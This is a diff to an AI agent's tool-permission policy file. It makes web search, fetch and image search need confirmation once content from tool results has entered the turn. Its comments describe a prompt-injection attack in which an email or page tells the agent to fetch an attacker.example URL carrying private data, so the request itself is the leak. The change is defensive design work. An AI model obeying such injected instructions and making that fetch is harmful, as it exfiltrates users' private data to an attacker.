@@ -114,17 +114,36 @@ policy:
     - pattern: "str_replace"
       tier: 2
 
-    # Outbound reads. Tier 1 because Article II tiers by CONSEQUENCE, not by
-    # whether a packet leaves the machine: a search creates nothing, modifies
-    # nothing and notifies nobody. Exfiltration is Article III's territory —
-    # nothing read from a tool result may initiate an action — and tiering
-    # searches does not help that while costing a confirmation on every lookup.
+    # Outbound reads: each sends an agent-chosen URL or query off the machine
+    # (every provider: ddg/serper/tavily/exa/firecrawl search, jina/exa/
+    # firecrawl fetch, image search, all registered under these three names).
+    # Tier 1 in a clean turn: a lookup the user asked for creates nothing,
+    # modifies nothing and notifies nobody, and a card on every lookup trains
+    # approving without reading.
+    #
+    # Tier 3 once content has entered the turn (`after_content`: the call's
+    # origin is not the user's own message: a tool result, an automation's
+    # turn, or a cause nobody could tell; app/policy/lineage.py). An email or
+    # page the agent read can tell it to fetch
+    # https://attacker.example/?d=<private data>, and the fetch IS the leak:
+    # the request reaches the attacker's server whatever comes back
+    # (zero-click exfiltration, review 4; user decision 2026-10-21). From
+    # there the call is a card, confirmable only with its button.
     - pattern: "web_search"
       tier: 1
+      exceptions:
+        - after_content: true
+          tier: 3
     - pattern: "web_fetch"
       tier: 1
+      exceptions:
+        - after_content: true
+          tier: 3
     - pattern: "image_search"
       tier: 1
+      exceptions:
+        - after_content: true
+          tier: 3
     # Starts a preview server in the user's own sandbox — reversible (it can be
     # stopped) and worth mentioning, so Tier 2 rather than silent.
     - pattern: "preview"
